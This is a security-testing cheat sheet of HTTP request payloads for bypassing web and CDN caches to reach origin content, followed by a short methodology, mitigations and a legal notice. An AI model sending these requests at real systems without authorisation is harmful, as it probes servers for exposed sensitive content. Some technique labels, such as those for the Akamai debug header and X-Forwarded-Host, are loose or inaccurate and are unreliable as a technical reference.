# **Cache Bypass Payload Cheat Sheet**

Cache bypass techniques allow attackers to circumvent caching mechanisms and access fresh (potentially sensitive) content from the origin server. Below are various payloads for testing cache validation vulnerabilities.

## **1. Basic Cache Bypass Techniques**

### **Cache Buster Parameters**
```http
GET /account?cb=123456789 HTTP/1.1
GET /profile?timestamp=1680000000 HTTP/1.1
```

### **Randomized Headers**
```http
GET / HTTP/1.1
Host: example.com
X-Random-Header: 5f8d2e1c
```

## **2. Header-Based Cache Bypass**

### **Vary Header Manipulation**
```http
GET /admin HTTP/1.1
Host: example.com
User-Agent: Mozilla/1.0 (Bypass 1.0)
Accept-Language: zh-CN
```

### **Cookie-Based Cache Invalidation**
```http
GET /dashboard HTTP/1.1
Host: example.com
Cookie: bypass_cache=1
```

## **3. Advanced Cache Bypass Methods**

### **HTTP/2 Cache Probing**
```http
:method: GET
:path: /settings
:authority: example.com
cache-buster: a1b2c3d4
```

### **Cache Key Normalization Exploits**
```http
GET /profile HTTP/1.1
Host: example.com
X-Forwarded-Host: bypass.example.com
```

## **4. Browser Cache Bypass**

### **Hard Refresh Payloads**
```html
<a href="/private" onclick="location.reload(true)">Force Refresh</a>
```

### **Cache-Control Override**
```http
GET /api/data HTTP/1.1
Host: example.com
Cache-Control: no-store, max-age=0
Pragma: no-cache
```

## **5. CDN-Specific Bypass Techniques**

### **CloudFront Bypass**
```http
GET / HTTP/1.1
Host: example.com
X-Forwarded-Port: 12345
```

### **Akamai Cache Bypass**
```http
GET /secret.txt HTTP/1.1
Host: example.com
Pragma: akamai-x-get-cache-key
```

## **6. Real-World Exploit Examples**

### **Bypassing Cached Authentication Pages**
```http
GET /login?nocache=1 HTTP/1.1
Host: example.com
Authorization: Basic invalid
```

### **Accessing Uncached API Responses**
```http
GET /api/users?sort=random() HTTP/1.1
Host: example.com
X-Request-ID: 7d3e9f1a
```

## **Testing Methodology**
1. Identify cacheable endpoints
2. Test with random parameters/headers
3. Verify `X-Cache` response headers
4. Check for cache key normalization issues
5. Attempt to force origin hits

## **Mitigation**
- Implement proper cache validation
- Use strong cache keys
- Set appropriate Cache-Control headers
- Regularly audit caching rules

## **Legal Notice**
Use these techniques only on authorized systems. Unauthorized testing may violate laws.